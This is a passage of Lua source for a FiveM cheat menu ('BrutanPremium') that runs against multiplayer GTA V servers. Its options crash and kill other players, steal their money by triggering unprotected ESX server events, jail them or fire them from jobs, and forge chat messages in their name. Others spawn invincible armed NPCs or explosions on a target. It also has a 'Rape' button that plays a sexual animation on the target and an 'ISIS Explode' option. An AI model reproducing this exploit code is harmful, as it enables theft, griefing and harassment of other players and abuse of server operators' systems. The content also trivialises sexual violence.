                        if NetworkIsPlayerActive(i) and GetPlayerServerId(i) ~= 0 and BrutanPremium.MenuButton("~r~→  ~s~Name: "..GetPlayerName(i).." | ID: "..GetPlayerServerId(i).." | "..(IsPedDeadOrDying(GetPlayerPed(i), 1) and "~r~Dead ~s~|" or "~g~Alive ~s~|"), "PlayerOptionsMenu") then
                            SelectedPlayer = i
                        end
                    end

                    BrutanPremium.Display()
                elseif BrutanPremium.IsMenuOpened("PlayerOptionsMenu") then
                    BrutanPremium.SetSubTitle("PlayerOptionsMenu", "Player Options ["..GetPlayerName(SelectedPlayer).."]")
                    if BrutanPremium.Button("Spectate", (Spectating and "~g~[SPECTATING]")) then
                        SpectatePlayer(SelectedPlayer)
					elseif BrutanPremium.Button('~g~Heal ~s~Player') then
                    local dU = 'PICKUP_HEALTH_STANDARD'
                    local dV = GetHashKey(dU)
                    local bK = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                    CreateAmbientPickup(dV, bK.x, bK.y, bK.z + 1.0, 1, 1, dV, 1, 0)
                    SetPickupRegenerationTime(pickup, 60)
                elseif BrutanPremium.Button('~b~Armour ~s~Player') then
                    local dW = 'PICKUP_ARMOUR_STANDARD'
                    local dX = GetHashKey(dW)
                    local bK = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                    local pickup = CreateAmbientPickup(dX, bK.x, bK.y, bK.z + 1.0, 1, 1, dX, 1, 0)
                    SetPickupRegenerationTime(pickup, 60)
                elseif BrutanPremium.Button('~b~FULL Armour ~s~Player') then
                    local dW = 'PICKUP_ARMOUR_STANDARD'
                    local dX = GetHashKey(dW)
                    local bK = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                    for i = 0, 99 do
                        Citizen.Wait(0)
                        CreateAmbientPickup(dX, bK.x, bK.y, bK.z + 1.0, 1, 1, dX, 1, 0)
                        SetPickupRegenerationTime(pickup, 10)
                        i = i + 1
                    end
					elseif BrutanPremium.Button("Open inventory") then
					TriggerEvent("esx_inventoryhud:openPlayerInventory", GetPlayerServerId(SelectedPlayer), GetPlayerName(SelectedPlayer))
					elseif BrutanPremium.Button("Teleport To Player With Vehicle") then
										drawNotification(
                            'Do you want to teleport to the player? ~g~y ~s~/ ~r~n'
                        )
                    local cP = KeyboardInput('Are you sure you want to teleport? y/n', '', 0)
                    if cP == 'y' then
                        local Entity =
                            IsPedInAnyVehicle(PlayerPedId(-1), false) and GetVehiclePedIsUsing(PlayerPedId(-1)) or
                            PlayerPedId(-1)
                        SetEntityCoords(Entity, GetEntityCoords(GetPlayerPed(SelectedPlayer)), 0.0, 0.0, 0.0, false)
                    elseif cP == 'n' then
                        drawNotification(
                            '~h~~r~Operation cancelled~s~.'
                        )
                    else
                        drawNotification(
                            '~h~~r~Invalid Confirmation~s~.'
                        )
                        drawNotification(
                            '~h~~r~Operation cancelled~s~.'
                        )
                    end
                    elseif BrutanPremium.Button("Teleport To Player") then
										drawNotification(
                            'Do you want to teleport to the player? ~g~y ~s~/ ~r~n'
                        )
                    local cP = KeyboardInput('Are you sure you want to teleport? y/n', '', 0)
                    if cP == 'y' then
                        local Entity =
                            IsPedInAnyVehicle(PlayerPedId(-1), false) and GetVehiclePedIsUsing(PlayerPedId(-1)) or
                            PlayerPedId(-1)
                        SetEntityCoords(Entity, GetEntityCoords(GetPlayerPed(SelectedPlayer)), 0.0, 0.0, 0.0, false)
                    elseif cP == 'n' then
                        drawNotification(
                            '~h~~r~Operation cancelled~s~.'
                        )
                    else
                        drawNotification(
                            '~h~~r~Invalid Confirmation~s~.'
                        )
                        drawNotification(
                            '~h~~r~Operation cancelled~s~.'
                        )
                    end
					elseif BrutanPremium.Button("~g~Give ~w~Money") then
						local result = KeyboardInput("Enter amount of money to give", "", 100000000)
						if result then
						TriggerServerEvent('esx:giveInventoryItem', GetPlayerServerId(SelectedPlayer), "item_money", "money", result)    
						end
                    elseif BrutanPremium.Button("Crash Player") then
                        CrashPlayer(GetPlayerPed(SelectedPlayer))
                    elseif BrutanPremium.MenuButton("~r~→  ~s~Troll Options", "PlayerTrollMenu") then
                    elseif BrutanPremium.MenuButton("~r~→  ~s~ESX Options", "PlayerESXMenu") then
                    elseif BrutanPremium.MenuButton("~r~→  ~s~Choose weapon", "SingleWepPlayer") then
                    elseif BrutanPremium.Button("Give Ammo") then
                        for i = 1, #allWeapons do
                            AddAmmoToPed(GetPlayerPed(SelectedPlayer), GetHashKey(allWeapons[i]), 250)
                        end
                    elseif BrutanPremium.Button("Give All Weapons") then
                        for i = 1, #allWeapons do
                            GiveWeaponToPed(GetPlayerPed(SelectedPlayer), GetHashKey(allWeapons[i]), 250, false, false)
                        end
                    elseif BrutanPremium.Button("Remove All Weapons") then
                        for i = 1, #allWeapons do
                            RemoveAllPedWeapons(GetPlayerPed(SelectedPlayer), true)
                        end
                    elseif BrutanPremium.Button("Give Vehicle") then
                        local ped = GetPlayerPed(SelectedPlayer)
                        local ModelName = KeyboardInput("Enter Vehicle Spawn Name", "", 100)

                        if ModelName and IsModelValid(ModelName) and IsModelAVehicle(ModelName) then
                            RequestModel(ModelName)
                            while not HasModelLoaded(ModelName) do
                                Citizen.Wait(0)
                            end

                            local veh = CreateVehicle(GetHashKey(ModelName), GetEntityCoords(ped), GetEntityHeading(ped), true, true)
                            drawNotification("~g~Vehicle Given To Player!")
                        else
                            drawNotification("~r~Model is not valid!")
                        end
					elseif BrutanPremium.Button('Clone Car') then
                    ClonePedVeh()
					elseif BrutanPremium.Button('Spawn Following Asshat') then
                    Citizen.CreateThread(function()
                    asshat = true
                    local target = GetPlayerPed(SelectedPlayer)
                    local assped = nil
                    local vehlist = {'Nero', 'Deluxo', 'Raiden', 'Bati2', "SultanRS", "TA21", "Lynx", "ZR380", "Streiter", "Neon", "Italigto", "Nero2", "Fmj", "le7b", "prototipo", "cyclone", "khanjali", "STROMBERG", "BARRAGE", "COMET5"}
                    local veh = vehlist[math.random(#vehlist)]
                    local pos = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                    local pitch = GetEntityPitch(GetPlayerPed(SelectedPlayer))
                    local roll = GetEntityRoll(GetPlayerPed(SelectedPlayer))
                    local yaw = GetEntityRotation(GetPlayerPed(SelectedPlayer)).z
                    local xf = GetEntityForwardX(GetPlayerPed(SelectedPlayer))
                    local yf = GetEntityForwardY(GetPlayerPed(SelectedPlayer))
                    if IsPedInAnyVehicle(GetPlayerPed(SelectedPlayer), false) then
                        local vt = GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), 0)
                        NetworkRequestControlOfEntity(vt)
                        SetVehicleModKit(vt, 0)
                        ToggleVehicleMod(vt, 20, 1)
                        SetVehicleModKit(vt, 0)
                        SetVehicleTyresCanBurst(vt, 1)
                    end
                    local v = nil
                    RequestModel(veh)
                    RequestModel('s_m_y_hwaycop_01')
                    while not HasModelLoaded(veh) and not HasModelLoaded('s_m_m_security_01') do
                        RequestModel('s_m_y_hwaycop_01')
                        Citizen.Wait(0)
                        RequestModel(veh)
                    end
                    if HasModelLoaded(veh) then
                        Citizen.Wait(50)
                        v =
                            CreateVehicle(
                            veh,
                            pos.x - (xf * 10),
                            pos.y - (yf * 10),
                            pos.z + 1,
                            GetEntityHeading(GetPlayerPed(-1)),
                            1,
                            1
                        )
                        v1 =
                            CreateVehicle(
                            veh,
                            pos.x - (xf * 10) + 2,
                            pos.y - (yf * 10) + 2,
                            pos.z + 1,
                            GetEntityHeading(GetPlayerPed(-1)),
                            1,
                            1
                        )
                        SetVehicleGravityAmount(v, 15.0)
                        SetVehicleGravityAmount(v1, 15.0)
                        SetEntityInvincible(v, true)
                        SetEntityInvincible(v1, true)
                        if DoesEntityExist(v) then
                            NetworkRequestControlOfEntity(v)
                            SetVehicleDoorsLocked(v, 4)
                            RequestModel('s_m_y_hwaycop_01')
                            Citizen.Wait(50)
                            if HasModelLoaded('s_m_y_hwaycop_01') then
                                Citizen.Wait(50)
                                local pas = CreatePed(21, GetHashKey('s_m_y_swat_01'), pos.x, pos.y, pos.z, true, false)
                                local pas1 = CreatePed(21, GetHashKey('s_m_y_swat_01'), pos.x, pos.y, pos.z, true, false)
                                local ped = CreatePed(21, GetHashKey('s_m_y_hwaycop_01'), pos.x, pos.y, pos.z, true, false)
                                local ped1 = CreatePed(21, GetHashKey('s_m_y_hwaycop_01'), pos.x, pos.y, pos.z, true, false)
                                assped = ped
                                if DoesEntityExist(ped1) and DoesEntityExist(ped) then
                                    GiveWeaponToPed(pas, GetHashKey('WEAPON_APPISTOL'), 9999, 1, 1)
                                    GiveWeaponToPed(pas1, GetHashKey('WEAPON_APPISTOL'), 9999, 1, 1)
                                    GiveWeaponToPed(ped, GetHashKey('WEAPON_APPISTOL'), 9999, 1, 1)
                                    GiveWeaponToPed(ped1, GetHashKey('WEAPON_APPISTOL'), 9999, 1, 1)
                                    SetPedIntoVehicle(ped, v, -1)
                                    SetPedIntoVehicle(ped1, v1, -1)
                                    SetPedIntoVehicle(pas, v, 0)
                                    SetPedIntoVehicle(pas1, v1, 0)
                                    TaskVehicleEscort(ped1, v1, target, -1, 50.0, 1082917029, 7.5, 0, -1)
                                    asstarget = target
                                    TaskVehicleEscort(ped, v, target, -1, 50.0, 1082917029, 7.5, 0, -1)
                                    SetDriverAbility(ped, 10.0)
                                    SetDriverAggressiveness(ped, 10.0)
                                    SetDriverAbility(ped1, 10.0)
                                    SetDriverAggressiveness(ped1, 10.0)
                                end
                            end
                        end
                    end
                end)
                    elseif BrutanPremium.Button("Kick From Vehicle") then
                        ClearPedTasksImmediately(GetPlayerPed(SelectedPlayer))
                        drawNotification("~g~Kicked Player From Vehicle!")
					elseif BrutanPremium.Button("Kill Player") then
					SetEntityHealth(GetPlayerPed(SelectedPlayer), 0)
					SetEntityHealth(GetPlayerPedId(SelectedPlayer), 0)
                    elseif BrutanPremium.Button("Spawn Flare On Player") then
                        local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                        ShootSingleBulletBetweenCoords(coords.x, coords.y , coords.z, coords.x, coords.y, coords.z, 100, true, GetHashKey("WEAPON_FLAREGUN"), PlayerPedId(), true, true, 100)
                    elseif BrutanPremium.Button("Spawn Smoke On Player") then
                        local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                        ShootSingleBulletBetweenCoords(coords.x, coords.y, coords.z, coords.x, coords.y, coords.z, 100, true, GetHashKey("WEAPON_SMOKEGRENADE"), GetPlayerPed(SelectedPlayer), true, true, 100)
                    end

                    BrutanPremium.Display()
                elseif BrutanPremium.IsMenuOpened("PlayerESXMenu") then
                    if BrutanPremium.MenuButton("~r~→  ~s~ESX Triggers", "PlayerESXTriggerMenu") then
                    elseif BrutanPremium.MenuButton("~r~→  ~s~ESX Jobs", "PlayerESXJobMenu") then
                    end

                    BrutanPremium.Display()
                elseif BrutanPremium.IsMenuOpened("PlayerESXTriggerMenu") then
                    if BrutanPremium.Button("ESX Revive") then
					TriggerServerEvent("esx_ambulancejob:revive", GetPlayerServerId(SelectedPlayer))
                    TriggerServerEvent("esx_ambulancejob:revive",GetPlayerServerId(selectedPlayer),GetPlayerServerId(selectedPlayer))
					TriggerServerEvent("whoapd:revive", GetPlayerServerId(SelectedPlayer))
				    TriggerServerEvent("paramedic:revive", GetPlayerServerId(SelectedPlayer))
				    TriggerServerEvent("ems:revive", GetPlayerServerId(SelectedPlayer))
					local ax = GetPlayerPed(SelectedPlayer)
                    local bK = GetEntityCoords(ax)
                    TriggerServerEvent('esx_ambulancejob:setDeathStatus', false)
                    local dZ = {
                        x = ESX.Math.Round(bK.x, 1),
                        y = ESX.Math.Round(bK.y, 1),
                        z = ESX.Math.Round(bK.z, 1)
                    }
                    StopScreenEffect('DeathFailOut')
                    DoScreenFadeIn(800)
					elseif BrutanPremium.Button("Fire player from job (~g~ESX~s~)") then
				    FirePlayer(SelectedPlayer)
                    elseif BrutanPremium.Button("ESX Give Money To Player From Your Wallet") then
                        local d = KeyboardInput("Enter amount of money to give","",100)
                        if d ~= "" then
                            TriggerServerEvent("esx:giveInventoryItem",GetPlayerServerId(selectedPlayer),"item_money","money",d)
                        end
                    elseif BrutanPremium.Button("ESX Steal Money From Player") then
                        local d=KeyboardInput("Enter amount of money to steal","",100)
                        if d ~= "" then
                            TriggerServerEvent("esx:removeInventoryItem",GetPlayerServerId(selectedPlayer),"item_money","money",d)
                        end
                    elseif BrutanPremium.Button("ESX Handcuff Player") then
                        TriggerServerEvent("esx_policejob:handcuff",GetPlayerServerId(selectedPlayer))
                    elseif BrutanPremium.Button("ESX Send To Jail") then
                        TriggerServerEvent("esx-qalle-jail:jailPlayer",GetPlayerServerId(selectedPlayer),5000,"Jailed")
                           TriggerServerEvent("esx_jailer:sendToJail",GetPlayerServerId(selectedPlayer),45*60)
                           TriggerServerEvent("esx_jail:sendToJail",GetPlayerServerId(selectedPlayer),45*60)
                        TriggerServerEvent("js:jailuser",GetPlayerServerId(selectedPlayer),45*60,"Jailed")
                    elseif BrutanPremium.Button("ESX Get Out Of Jail") then
                        local ped = selectedPlayer
                        TriggerServerEvent("esx-qalle-jail:jailPlayer",GetPlayerServerId(ped),0,"escaperino")
                        TriggerServerEvent("esx_jailer:sendToJail",GetPlayerServerId(ped),0)
                        TriggerServerEvent("esx_jail:sendToJail",GetPlayerServerId(ped),0)
                        TriggerServerEvent("js:jailuser",GetPlayerServerId(ped),0,"escaperino")
                    end

                    BrutanPremium.Display()
                elseif BrutanPremium.IsMenuOpened("PlayerESXJobMenu") then
                    if BrutanPremium.Button("Unemployed") then
                        TriggerServerEvent("NB:destituerplayer",GetPlayerServerId(selectedPlayer))
                    elseif BrutanPremium.Button("Police") then
                        TriggerServerEvent("NB:recruterplayer",GetPlayerServerId(selectedPlayer),"police",3)
                    elseif BrutanPremium.Button("Mechanic") then
                        TriggerServerEvent("NB:recruterplayer",GetPlayerServerId(selectedPlayer),"mecano",3)
                    elseif BrutanPremium.Button("Taxi") then
                        TriggerServerEvent("NB:recruterplayer",GetPlayerServerId(selectedPlayer),"taxi",3)
                    elseif BrutanPremium.Button("Ambulance") then
                        TriggerServerEvent("NB:recruterplayer",GetPlayerServerId(selectedPlayer),"ambulance",3)
                    elseif BrutanPremium.Button("Real Estate Agent") then
                        TriggerServerEvent("NB:recruterplayer",GetPlayerServerId(selectedPlayer),"realestateagent",3)
                    elseif BrutanPremium.Button("Car Dealer") then
                        TriggerServerEvent("NB:recruterplayer",GetPlayerServerId(selectedPlayer),"cardealer",3)
                    end


                    BrutanPremium.Display()
                elseif BrutanPremium.IsMenuOpened("PlayerTrollMenu") then
                    if BrutanPremium.Button ("Fake Chat Message") then
                        local cX=KeyboardInput("Enter message to send","",100)
                        local cY=GetPlayerName(selectedPlayer)
                        if cX then
                            TriggerServerEvent("_chat:messageEntered",cY,{0,0x99,255},cX)
                        end
				elseif BrutanPremium.Button("Ram w/ Custom Vehicle") then
				local cPs = KeyboardInput('Are you sure you want to ram the player? y/n', '', 0)
				if cPs == 'y' then
						local ModelName1 = KeyboardInput("Enter Vehicle Name", "", 100)
				        if ModelName1 and IsModelValid(ModelName1) and IsModelAVehicle(ModelName1) then
                        local model = GetHashKey(ModelName1)
                        RequestModel(model)
                        while not HasModelLoaded(model) do
                            Citizen.Wait(0)
                        end
                        local offset = GetOffsetFromEntityInWorldCoords(GetPlayerPed(selectedPlayer), 0, -10.0, 0)
                        if HasModelLoaded(model) then
                            local veh = CreateVehicle(model, offset.x, offset.y, offset.z, GetEntityHeading(GetPlayerPed(selectedPlayer)), true, true)	
                            SetVehicleForwardSpeed(veh, 120.0)		
                        end		
											                    else
                        drawNotification("~r~Model Isn't Valid You Tard")
						end
						elseif cPs == 'n' then
                        drawNotification(
                            '~h~~r~Operation cancelled~s~.'
                        )
					    else
                        drawNotification(
                            '~h~~r~Invalid Confirmation~s~.'
                        )
                        drawNotification(
                            '~h~~r~Operation cancelled~s~.'
                        )
                    end
				elseif BrutanPremium.Button('~y~Explode ~s~Vehicle') then
                    if IsPedInAnyVehicle(GetPlayerPed(SelectedPlayer), true) then
                        AddExplosion(GetEntityCoords(GetPlayerPed(SelectedPlayer)), 4, 1337.0, false, true, 0.0)
                    else
                        av('~h~~b~Player not in a vehicle~s~.', false)
                    end
                elseif BrutanPremium.Button('~r~Banana ~p~Party') then
                    local bH = CreateObject(GetHashKey('p_crahsed_heli_s'), 0, 0, 0, true, true, true)
                    local bI = CreateObject(GetHashKey('prop_rock_4_big2'), 0, 0, 0, true, true, true)
                    local bJ = CreateObject(GetHashKey('prop_beachflag_le'), 0, 0, 0, true, true, true)
                    AttachEntityToEntity(
                        bH,
                        GetPlayerPed(SelectedPlayer),
                        GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 57005),
                        0.4,
                        0,
                        0,
                        0,
                        270.0,
                        60.0,
                        true,
                        true,
                        false,
                        true,
                        1,
                        true
                    )
                    AttachEntityToEntity(
                        bI,
                        GetPlayerPed(SelectedPlayer),
                        GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 57005),
                        0.4,
                        0,
                        0,
                        0,
                        270.0,
                        60.0,
                        true,
                        true,
                        false,
                        true,
                        1,
                        true
                    )
                    AttachEntityToEntity(
                        bJ,
                        GetPlayerPed(SelectedPlayer),
                        GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 57005),
                        0.4,
                        0,
                        0,
                        0,
                        270.0,
                        60.0,
                        true,
                        true,
                        false,
                        true,
                        1,
                        true
                    )
                elseif BrutanPremium.Button('~r~ISIS Explode') then
                    AddExplosion(GetEntityCoords(GetPlayerPed(SelectedPlayer)), 5, 3000.0, true, false, 100000.0)
                    AddExplosion(GetEntityCoords(GetPlayerPed(SelectedPlayer)), 5, 3000.0, true, false, true)
				elseif BrutanPremium.Button("Small invisible Explosion") then
                        AddExplosion(GetEntityCoords(GetPlayerPed(SelectedPlayer)), 2, 100000.0, false, true, 0)
                elseif BrutanPremium.Button('~r~Rape') then
                    RequestModelSync('a_m_o_acult_01')
                    RequestAnimDict('rcmpaparazzo_2')
                    while not HasAnimDictLoaded('rcmpaparazzo_2') do
                        Citizen.Wait(0)
                    end
                    if IsPedInAnyVehicle(GetPlayerPed(SelectedPlayer), true) then
                        local veh = GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), true)
                        while not NetworkHasControlOfEntity(veh) do
                            NetworkRequestControlOfEntity(veh)
                            Citizen.Wait(0)
                        end
                        SetEntityAsMissionEntity(veh, true, true)
                        DeleteVehicle(veh)
                        DeleteEntity(veh)
                    end
                    count = -0.2
                    for b = 1, 3 do
                        local x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(SelectedPlayer), true))
                        local bS = CreatePed(4, GetHashKey('a_m_o_acult_01'), x, y, z, 0.0, true, false)
                        SetEntityAsMissionEntity(bS, true, true)
                        AttachEntityToEntity(
                            bS,
                            GetPlayerPed(SelectedPlayer),
                            4103,
                            11816,
                            count,
                            0.00,
                            0.0,
                            0.0,
                            0.0,
                            0.0,
                            false,
                            false,
                            false,
                            false,
                            2,
                            true
                        )
                        ClearPedTasks(GetPlayerPed(SelectedPlayer))
                        TaskPlayAnim(
                            GetPlayerPed(SelectedPlayer),
                            'rcmpaparazzo_2',
                            'shag_loop_poppy',
                            2.0,
                            2.5,
                            -1,
                            49,
                            0,
                            0,
                            0,
                            0
                        )
                        SetPedKeepTask(bS)
                        TaskPlayAnim(bS, 'rcmpaparazzo_2', 'shag_loop_a', 2.0, 2.5, -1, 49, 0, 0, 0, 0)
                        SetEntityInvincible(bS, true)
                        count = count - 0.4
                    end
                elseif BrutanPremium.Button('~r~Cage ~s~Player') then
                    x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(SelectedPlayer)))
                    roundx = tonumber(string.format('%.2f', x))
                    roundy = tonumber(string.format('%.2f', y))
                    roundz = tonumber(string.format('%.2f', z))
                    local e7 = 'prop_fnclink_05crnr1'
                    local e8 = GetHashKey(e7)
                    RequestModel(e8)
                    while not HasModelLoaded(e8) do
                        Citizen.Wait(0)
                    end
                    local e9 = CreateObject(e8, roundx - 1.70, roundy - 1.70, roundz - 1.0, true, true, false)
                    local ea = CreateObject(e8, roundx + 1.70, roundy + 1.70, roundz - 1.0, true, true, false)
                    SetEntityHeading(e9, -90.0)
                    SetEntityHeading(ea, 90.0)
                    FreezeEntityPosition(e9, true)
                    FreezeEntityPosition(ea, true)
                elseif BrutanPremium.Button('Wall ~s~Player') then
                    local eb = 'xs_prop_hamburgher_wl'
                    local ec = -145066854
                    local ed = CreateObject(ec, 0, 0, 0, true, true, true)
                    AttachEntityToEntity(
                        ed,
                        GetPlayerPed(SelectedPlayer),
                        GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 0),
                        0,
                        0,
                        -1.0,
                        0.0,
                        0.0,
                        0,
                        true,
                        true,
                        false,
                        true,
                        1,
                        true
                    )
                elseif BrutanPremium.Button('Wall ~s~Player Car') then
                    local eb = 'xs_prop_hamburgher_wl'
                    local ec = -145066854
                    local ed = CreateObject(ec, 0, 0, 0, true, true, true)
                    AttachEntityToEntity(
                        ed,
                        GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), false),
                        GetEntityBoneIndexByName(GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), false), 'chassis'),
                        0,
                        0,
                        -1.0,
                        0.0,
                        0.0,
                        0,
                        true,
                        true,
                        false,
                        true,
                        1,
                        true
                    )
                elseif BrutanPremium.Button('Fuck Up ~s~Player') then
                    j = true
                    x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(SelectedPlayer)))
                    roundx = tonumber(string.format('%.2f', x))
                    roundy = tonumber(string.format('%.2f', y))
                    roundz = tonumber(string.format('%.2f', z))
                    local ee = 'sr_prop_spec_tube_xxs_01a'
                    local ef = GetHashKey(ee)
                    RequestModel(ef)
                    RequestModel(smashhash)
                    while not HasModelLoaded(ef) do
                        Citizen.Wait(0)
                    end
                    local eg = CreateObject(ef, roundx, roundy, roundz - 5.0, true, true, false)
                    SetEntityRotation(eg, 0.0, 90.0, 0.0)
                    local eh = -356333586
                    local bR = 'WEAPON_SNOWBALL'
                    for i = 0, 10 do
                        local bK = GetEntityCoords(eg)
                        RequestModel(eh)
                        Citizen.Wait(50)
                        if HasModelLoaded(eh) then
                            local ped =
                                CreatePed(
                                21,
                                eh,
                                bK.x + math.sin(i * 2.0),
                                bK.y - math.sin(i * 2.0),
                                bK.z - 5.0,
                                0,
                                true,
                                true
                            ) and
                                CreatePed(
                                    21,
                                    eh,
                                    bK.x - math.sin(i * 2.0),
                                    bK.y + math.sin(i * 2.0),
                                    bK.z - 5.0,
                                    0,
                                    true,
                                    true
                                )
                            NetworkRegisterEntityAsNetworked(ped)
                            if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                local ei = PedToNet(ped)
                                NetworkSetNetworkIdDynamic(ei, false)
                                SetNetworkIdCanMigrate(ei, true)
                                SetNetworkIdExistsOnAllMachines(ei, true)
                                Citizen.Wait(500)
                                NetToPed(ei)
                                GiveWeaponToPed(ped, GetHashKey(bR), 9999, 1, 1)
                                SetCurrentPedWeapon(ped, GetHashKey(bR), true)
                                SetEntityInvincible(ped, true)
                                SetPedCanSwitchWeapon(ped, true)
                                TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0, 16)
                            elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                TaskCombatHatedTargetsInArea(ped, bK.x, bK.y, bK.z, 500)
                            else
                                Citizen.Wait(0)
                            end
                        end
                    end
				elseif BrutanPremium.Button("Spawn Mountain Lion") then
                    local mtlion = "A_C_MtLion"
                    for i = 0, 10 do
                        local co = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                        RequestModel(GetHashKey(mtlion))
                        Citizen.Wait(50)
                        if HasModelLoaded(GetHashKey(mtlion)) then
                            local ped =
                                CreatePed(21, GetHashKey(mtlion), co.x, co.y, co.z, 0, true, true)
                            NetworkRegisterEntityAsNetworked(ped)
                            if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                local ei = PedToNet(ped)
                                NetworkSetNetworkIdDynamic(ei, false)
                                SetNetworkIdCanMigrate(ei, true)
                                SetNetworkIdExistsOnAllMachines(ei, true)
                                Citizen.Wait(50)
                                NetToPed(ei)
                                TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0, 16)
                            elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                TaskCombatHatedTargetsInArea(ped, co.x, co.y, co.z, 500)
                            else
                                Citizen.Wait(0)
                            end
                        end
                    end
                elseif BrutanPremium.Button("~h~~r~Spawn ~s~Swat army with ~y~AK") then
                    local bQ = "s_m_y_swat_01"
                    local bR = "WEAPON_ASSAULTRIFLE"
                    for i = 0, 10 do
                        local bK = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                        RequestModel(GetHashKey(bQ))
                        Citizen.Wait(50)
                        if HasModelLoaded(GetHashKey(bQ)) then
                            local ped =
                                CreatePed(21, GetHashKey(bQ), bK.x + i, bK.y - i, bK.z, 0, true, true) and
                                CreatePed(21, GetHashKey(bQ), bK.x - i, bK.y + i, bK.z, 0, true, true)
                            NetworkRegisterEntityAsNetworked(ped)
                            if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                local ei = PedToNet(ped)
                                NetworkSetNetworkIdDynamic(ei, false)
                                SetNetworkIdCanMigrate(ei, true)
                                SetNetworkIdExistsOnAllMachines(ei, true)
                                Citizen.Wait(50)
                                NetToPed(ei)
                                GiveWeaponToPed(ped, GetHashKey(bR), 9999, 1, 1)
                                SetEntityInvincible(ped, true)
                                SetPedCanSwitchWeapon(ped, true)
                                TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0, 16)
                            elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                TaskCombatHatedTargetsInArea(ped, bK.x, bK.y, bK.z, 500)
                            else
                                Citizen.Wait(0)
                            end
                        end
                    end
					elseif BrutanPremium.Button("~h~~r~Spawn ~s~Swat army with ~y~RPG") then
                    local bQ = "s_m_y_swat_01"
                    local bR = "weapon_rpg"
                    for i = 0, 10 do
                        local bK = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                        RequestModel(GetHashKey(bQ))
                        Citizen.Wait(50)
                        if HasModelLoaded(GetHashKey(bQ)) then
                            local ped =
                                CreatePed(21, GetHashKey(bQ), bK.x + i, bK.y - i, bK.z, 0, true, true) and
                                CreatePed(21, GetHashKey(bQ), bK.x - i, bK.y + i, bK.z, 0, true, true)
                            NetworkRegisterEntityAsNetworked(ped)
                            if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                local ei = PedToNet(ped)
                                NetworkSetNetworkIdDynamic(ei, false)
                                SetNetworkIdCanMigrate(ei, true)
                                SetNetworkIdExistsOnAllMachines(ei, true)
                                Citizen.Wait(50)
                                NetToPed(ei)
                                GiveWeaponToPed(ped, GetHashKey(bR), 9999, 1, 1)
                                SetEntityInvincible(ped, true)
                                SetPedCanSwitchWeapon(ped, true)
                                TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0, 16)
                            elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                TaskCombatHatedTargetsInArea(ped, bK.x, bK.y, bK.z, 500)
                            else
                                Citizen.Wait(0)
                            end
                        end
                    end
					
                elseif BrutanPremium.Button("~h~~r~Spawn ~s~Swat army with ~y~Flaregun") then
                    local bQ = "s_m_y_swat_01"
                    local bR = "weapon_flaregun"
                    for i = 0, 10 do
                        local bK = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                        RequestModel(GetHashKey(bQ))
                        Citizen.Wait(50)
                        if HasModelLoaded(GetHashKey(bQ)) then
                            local ped =
                                CreatePed(21, GetHashKey(bQ), bK.x + i, bK.y - i, bK.z, 0, true, true) and
                                CreatePed(21, GetHashKey(bQ), bK.x - i, bK.y + i, bK.z, 0, true, true)
                            NetworkRegisterEntityAsNetworked(ped)
                            if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                local ei = PedToNet(ped)
                                NetworkSetNetworkIdDynamic(ei, false)
                                SetNetworkIdCanMigrate(ei, true)
                                SetNetworkIdExistsOnAllMachines(ei, true)
                                Citizen.Wait(50)
                                NetToPed(ei)
                                GiveWeaponToPed(ped, GetHashKey(bR), 9999, 1, 1)
                                SetEntityInvincible(ped, true)
                                SetPedCanSwitchWeapon(ped, true)
                                TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0, 16)
                            elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                TaskCombatHatedTargetsInArea(ped, bK.x, bK.y, bK.z, 500)
                            else
                                Citizen.Wait(0)
                            end
                        end
                    end
                elseif BrutanPremium.Button("~h~~r~Spawn ~s~Swat army with ~y~Railgun") then
                    local bQ = "s_m_y_swat_01"
                    local bR = "weapon_railgun"
                    for i = 0, 10 do
                        local bK = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                        RequestModel(GetHashKey(bQ))
                        Citizen.Wait(50)
                        if HasModelLoaded(GetHashKey(bQ)) then
                            local ped =
                                CreatePed(21, GetHashKey(bQ), bK.x + i, bK.y - i, bK.z, 0, true, true) and
                                CreatePed(21, GetHashKey(bQ), bK.x - i, bK.y + i, bK.z, 0, true, true)
                            NetworkRegisterEntityAsNetworked(ped)
                            if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                local ei = PedToNet(ped)
                                NetworkSetNetworkIdDynamic(ei, false)
                                SetNetworkIdCanMigrate(ei, true)
                                SetNetworkIdExistsOnAllMachines(ei, true)
                                Citizen.Wait(50)
                                NetToPed(ei)
